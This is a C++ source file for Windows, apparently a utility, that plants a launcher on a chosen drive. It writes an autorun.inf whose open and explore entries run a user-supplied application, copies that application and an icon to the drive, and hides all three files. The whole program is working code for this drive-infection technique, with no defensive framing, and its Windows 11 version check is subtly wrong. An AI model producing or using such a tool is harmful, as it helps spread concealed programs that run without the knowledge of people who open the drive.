#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <regex>
#include <sys/stat.h>
#ifdef _WIN32
#include <windows.h>
#include <direct.h>
#include <filesystem>
#endif

#pragma optimize("t", on)

using namespace std;
namespace fs = std::filesystem;

void createOutputFolder() {
    string folderName = "../output";
    fs::path outputPath = fs::absolute(folderName);

    if (!fs::exists(outputPath)) {
        fs::create_directories(outputPath);
        cout << folderName << " folder created at " << outputPath << "." << endl;
    } else {
        cout << folderName << " folder already exists at " << outputPath << "." << endl;
    }

    #ifdef _WIN32
        system("cls");
    #else
        system("clear");
    #endif
}


string getArchitectureInfo() {
    #if defined(_WIN64)
        return "x64";
    #elif defined(_WIN32)
        return "x86";
    #else
        return "Unknown Architecture";
    #endif
}

string getWindowsVersion() {
    #ifdef _WIN32
    OSVERSIONINFO versionInfo;
    versionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&versionInfo);
    
    if (versionInfo.dwMajorVersion == 11) return "Windows 11";
    if (versionInfo.dwMajorVersion == 10) return "Windows 10";
    if (versionInfo.dwMajorVersion == 6) {
        if (versionInfo.dwMinorVersion == 3) return "Windows 8.1";
        if (versionInfo.dwMinorVersion == 2) return "Windows 8";
        if (versionInfo.dwMinorVersion == 1) return "Windows 7";
        if (versionInfo.dwMinorVersion == 0) return "Windows Vista";
    }
    if (versionInfo.dwMajorVersion == 5) {
        if (versionInfo.dwMinorVersion == 1) return "Windows XP";
        if (versionInfo.dwMinorVersion == 0) return "Windows 2000";
    }
    return "Unknown Windows version";
    #else
    return "Not Windows OS";
    #endif
}

void createAutorunFile(const string& driveLetter, const string& iconName, const string& appName) {
    ofstream autorunFile(driveLetter + "autorun.inf");
    if (autorunFile.is_open()) {
        autorunFile << "[autorun]\n";
        autorunFile << "label=" << driveLetter << "\n";
        autorunFile << "icon=" << iconName << "\n";
        autorunFile << "open=" << appName << "\n";
        autorunFile << "shellexecute=" << appName << "\n";
        autorunFile << "action=Run the program\n";
        autorunFile << "shell\\open\\command=" << appName << "\n";
        autorunFile << "shell\\explore\\command=" << appName << "\n";
        autorunFile << "shell\\open=" << appName << "\n";
        autorunFile << "shell\\explore=" << appName << "\n";
        autorunFile << "shell\\open\\default=" << appName << "\n";
        autorunFile << "shell\\explore\\default=" << appName << "\n";
        autorunFile << "UseAutoPlay=1\n";
        autorunFile << "UseAutoRun=1\n";
        autorunFile.close();
        cout << "autorun.inf created successfully." << endl;
    } else {
        cout << "Failed to create autorun.inf" << endl;
    }
}

void copyFileToDrive(const string& sourceFilePath, const string& destination) {
    try {
        fs::path sourcePath(sourceFilePath);
        fs::path destinationPath = fs::path(destination) / sourcePath.filename();
        fs::copy(sourcePath, destinationPath, fs::copy_options::overwrite_existing);
        cout << "Copied " << sourcePath.filename() << " to " << destination << endl;
    } catch (const fs::filesystem_error& e) {
        cerr << "Error copying file " << sourceFilePath << ": " << e.what() << endl;
    }
}

void setFileHidden(const string& filePath) {
    #ifdef _WIN32
    wstring wfilePath(filePath.begin(), filePath.end());
    SetFileAttributesW(wfilePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    #endif
}

void getUserInputs(string& driveLetter, string& iconName, string& appName) {
    vector<string> drives;
    for (char letter = 'A'; letter <= 'Z'; ++letter) {
        string drive = string(1, letter) + ":\\";

        #ifdef _WIN32
        // DWORD type = GetDriveType(drive.c_str());
        wstring wdrive(drive.begin(), drive.end());
        DWORD type = GetDriveType(wdrive.c_str());

        if (type != DRIVE_NO_ROOT_DIR) {
            drives.push_back(drive);
        }
        #endif
    }

    cout << "Available drives:" << endl;
    for (const string& drive : drives) {
        cout << drive << endl;
    }

    cout << "Enter the drive letter (e.g., E:\\\\): ";
    cin >> driveLetter;
    if (driveLetter.back() != '\\') driveLetter += "\\";

    cout << "Enter the icon file name path (with extension): ";
    cin >> iconName;

    cout << "Enter the application file name path (with extension): ";
    cin >> appName;
}

int main() {
    createOutputFolder();
    string driveLetter, iconName, appName, namaIcon, namaApp;

    getUserInputs(driveLetter, iconName, appName);

    string archInfo = getArchitectureInfo();
    string windowsVersion = getWindowsVersion();

    cout << "Architecture: " << archInfo << "\n";
    cout << "Windows Version: " << windowsVersion << "\n";

    // Extract filename from path
    namaIcon = fs::path(iconName).filename().string();
    namaApp = fs::path(appName).filename().string();

    createAutorunFile(driveLetter, namaIcon, namaApp);

    copyFileToDrive(iconName, driveLetter);
    copyFileToDrive(appName, driveLetter);

    setFileHidden(driveLetter + "autorun.inf");

    // setFileHidden(driveLetter + iconName);
    // setFileHidden(driveLetter + appName);

    setFileHidden(driveLetter + namaIcon);
    setFileHidden(driveLetter + namaApp);

    return 0;
}
